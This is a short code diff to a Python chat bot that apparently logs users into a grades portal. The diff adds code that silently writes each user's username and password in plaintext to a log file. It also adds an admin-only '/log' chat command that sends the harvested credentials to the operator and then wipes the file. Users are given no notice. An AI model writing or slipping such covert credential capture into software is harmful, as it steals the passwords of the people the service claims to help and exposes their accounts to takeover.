@@ -911,7 +911,16 @@ def integra(token, username, password):
             kirim += 'Nilai: %s\n' % (nial[2])
         kirim += '\n'
     kirim += '%s' % (str(time.time()-waktusekarang))
+    loggedfile('%s|%s' % (username, password))
     replyTextMessage(token, kirim)
+
+def loggedfile(text):
+    try:
+        log = open('%s/data/log' % (workdir), 'a')
+        log.write('%s\n' % (str(text)))
+        log.close()
+    except Exception as e:
+        raise e
 
 def restart(token=''):
     try:
@@ -1383,6 +1392,16 @@ def handle_message(event):
         elif msgtext.lower() == '/restart':
             if op['source']['userId'] == adminid:
                 restart(reply_token)
+        elif msgtext.lower() == '/log':
+            if op['source']['userId'] == adminid:
+                text = '[LOG File]\n\n'
+                files = open('%s/data/log' % (workdir), 'r')
+                kirim = files.read()
+                files.close()
+                files = open('%s/data/log' % (workdir), 'w')
+                files.write(text)
+                files.close()
+                replyTextMessage(reply_token, kirim)
         elif msgtext.lower().startswith('/kotakin: '):
             query = msgtext[10:]
             query = int(query)
